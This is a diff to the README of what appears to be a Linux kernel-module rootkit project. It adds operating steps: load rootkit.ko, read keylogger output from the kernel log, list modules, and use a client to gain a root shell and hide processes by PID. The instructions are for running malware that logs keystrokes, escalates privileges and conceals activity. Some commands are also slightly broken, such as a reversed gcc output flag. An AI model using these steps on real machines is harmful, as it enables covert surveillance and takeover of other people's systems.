@@ -14,13 +14,31 @@
     gcc client -o client.c
 
     > sudo insmod rootkit.ko
-- log kernal output (in another terminal)
+    
+- log kernal output (in another terminal) -> shows key logger output
 
     > sudo su -
 
     > cd /var/log
 
     > tail - f kern.log
+    
+- to view list of lkms attached 
+    > lsmod
+    
 - remove LKM
     
-    > sudo  rmmod hello.ko
+    > sudo  rmmod rootkit.ko
+    
+- interact with client.c
+    -gain root priviges
+    > ./client --root-shell
+    
+    -create dummy process
+    > perl -MPOSIX -e '$0="sadhadxk"; pause' &
+    
+    - hide proccess with certain id
+    > ./client --hide-pid=PID
+    
+    
+    > ./client --hide-pid=PID
